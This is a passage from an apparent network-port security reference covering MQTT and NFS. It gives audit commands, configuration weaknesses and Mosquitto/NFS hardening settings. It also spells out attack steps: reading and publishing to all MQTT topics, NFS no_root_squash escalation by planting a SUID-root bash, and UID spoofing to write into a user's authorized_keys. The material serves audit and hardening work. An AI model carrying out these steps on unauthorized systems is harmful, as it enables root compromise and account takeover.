  * **Retained Message Harvesting & Command Injection**: When subscribing to `#`, the broker immediately delivers the last **Retained Message** (`RETAIN=1`) for every active topic, instantly mapping the entire topic schema. Test if ACLs block unauthorized clients from publishing (`PUBLISH`) commands to actuator topics.
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Nmap MQTT subscribe and $SYS broker telemetry audit
  nmap -sV -p 1883,8883 --script mqtt-subscribe <target-ip>

  # 2. Subscribe to all topics (#) and system diagnostics ($SYS/#) using mosquitto_sub (receive 10 messages and exit)
  mosquitto_sub -h <target-ip> -p 1883 -v -t '#' -t '$SYS/#' -C 10 -W 5

  # 3. Connect over MQTTS (8883/TCP) with mTLS client certificates
  mosquitto_sub -h <target-ip> -p 8883 --cafile ca.crt --cert client.crt --key client.key -v -t '#' -C 5
  ```
* **Common Configuration Weaknesses**:
  * Eclipse Mosquitto `< 2.0` defaulted to `allow_anonymous true` when bound to external interfaces, and operators upgrading to Mosquitto `2.0+` frequently add `allow_anonymous true` alongside `listener 1883 0.0.0.0` just to get IoT sensors working quickly.
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **Eclipse Mosquitto Hardening (`/etc/mosquitto/conf.d/hardening.conf`)**:
    ```ini
    per_listener_settings true
    allow_anonymous false
    password_file /etc/mosquitto/passwd
    acl_file /etc/mosquitto/acl.conf

    listener 8883 0.0.0.0
    tls_version tlsv1.3
    cafile /etc/mosquitto/certs/ca.crt
    certfile /etc/mosquitto/certs/server.crt
    keyfile /etc/mosquitto/certs/server.key
    require_certificate true
    use_identity_as_username true
    ```
  * In `/etc/mosquitto/acl.conf`, deny access to `$SYS/#` for all non-admin roles and restrict each IoT device's X.509 Common Name (`%u`) or Client ID (`%c`) to its own narrow topic subtree (`pattern readwrite devices/%u/telemetry`).

---

### [PORT-30] Port 2049/TCP, 2049/UDP — Network File System (NFS v3 / v4.1 / v4.2)

* **Transport Protocol & IANA Assignment**:
  * `2049/TCP`: Standard transport for NFSv4.0, NFSv4.1, and NFSv4.2 (stateful, firewall-friendly single port), as well as NFSv3.
  * `2049/UDP`: Legacy stateless NFSv2/NFSv3 transport (requires auxiliary `rpcbind` `111`, `mountd` `20048`, and `nlockmgr`).
* **RFC Specification**: RFC 1813 (NFS Version 3 Protocol Specification), RFC 7530 (NFS Version 4 Protocol), RFC 8881 (NFS Version 4 Minor Version 1), RFC 7862 (NFS Version 4 Minor Version 2), RFC 2203 (`RPCSEC_GSS`).
* **Architecture & Handshake Overview**:
  1. **NFSv3 vs. NFSv4 Architecture**:
     * **NFSv3**: Stateless protocol relying on external sideband ONC RPC daemons (`rpcbind` on `111` and `mountd` on `20048`/dynamic port) to resolve export paths into opaque 64-byte **File Handles (`fhandle3`)**.
     * **NFSv4.x**: Consolidates mounting, locking, and ACLs into a single stateful `COMPOUND` RPC procedure on `2049/TCP` rooted at a virtual pseudo-filesystem (`/`).
  2. **Authentication Models (`AUTH_SYS` vs. `RPCSEC_GSS`)**:
     * **`AUTH_SYS` (`AUTH_UNIX` — Default `sec=sys`)**: The NFS server blindly trusts the numeric `UID` and `GID` integers inside the client's RPC header! There is zero cryptographic verification of the user's identity—if an attacker has `root` on any machine permitted by the export IP list, they can forge any numeric `UID` (e.g., `UID=1000` or `UID=0`) in the RPC packet.
     * **`RPCSEC_GSS` (`sec=krb5`, `sec=krb5i`, `sec=krb5p`)**: Replaces `AUTH_SYS` with Kerberos v5 tickets (`krb5` = authentication, `krb5i` = integrity checksums, `krb5p` = full encryption of file contents on the wire).
* **Authorized Security Audit Checklist**:
  * **World-Readable / Subnet-Wide Exports (`showmount -e`)**: Enumerate `/etc/exports` via `MOUNTPROC3_EXPORT` (`showmount -e <target-ip>`) or by mounting the NFSv4 pseudo-root (`mount -t nfs4 <target-ip>:/ /mnt`).
  * **`no_root_squash` Local-to-Remote Root Privilege Escalation**: By default, `root_squash` maps incoming `UID=0` (`root`) requests to `nfsnobody` (`65534`). If an administrator configures `no_root_squash` on a writable export, an attacker can mount the share from their own machine (or from a compromised low-privileged container), copy `/bin/bash` onto the share as `root` (`chown root:root bash && chmod 4755 bash`), and execute the SUID-root binary on the target server to gain instant `root`.
  * **`AUTH_SYS` UID Spoofing**: Even when `root_squash` *is* enabled, because `sec=sys` trusts arbitrary non-zero UIDs, an attacker who mounts `/home` can inspect the numeric owner UID of `/home/admin` (e.g., `UID=1001`), create a local user with `UID=1001` (or use `libnfs` in user-space without local root), and write directly to `/home/admin/.ssh/authorized_keys`!
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Enumerate exported NFSv3 file systems and allowed client ACLs
  showmount -e <target-ip>

  # 2. Nmap audit of NFS exports, file permissions, and statfs metadata
  nmap -sV -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs <target-ip>

  # 3. Inspect local /etc/exports and active kernel export table flags (root_squash vs no_root_squash, sec=krb5p)
  cat /etc/exports && sudo exportfs -v
  ```
* **Common Configuration Weaknesses**:
  * Wildcard exports (`/srv/nfs *(rw,sync,no_root_squash)`) or broad CIDR exports (`10.0.0.0/8(rw)`) using default `sec=sys` (`AUTH_SYS`).
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **CIS Linux Benchmark Hardening (`/etc/exports` & `/etc/nfs.conf`)**:
    * Disable NFSv2 and NFSv3 in `/etc/nfs.conf` (`vers2=n`, `vers3=n`, `udp=n`), running strictly **NFSv4.2 over TCP/2049**.
    * Enforce Kerberos privacy (`sec=krb5p`), `root_squash`, and explicit host IPs in `/etc/exports`:
      ```text
      /srv/nfs/appdata 10.20.30.15(rw,sync,root_squash,no_subtree_check,sec=krb5p)
      ```
    * On all NFS client mounts in `/etc/fstab`, enforce `nosuid,nodev,noexec` to neutralize SUID binary planting.

---
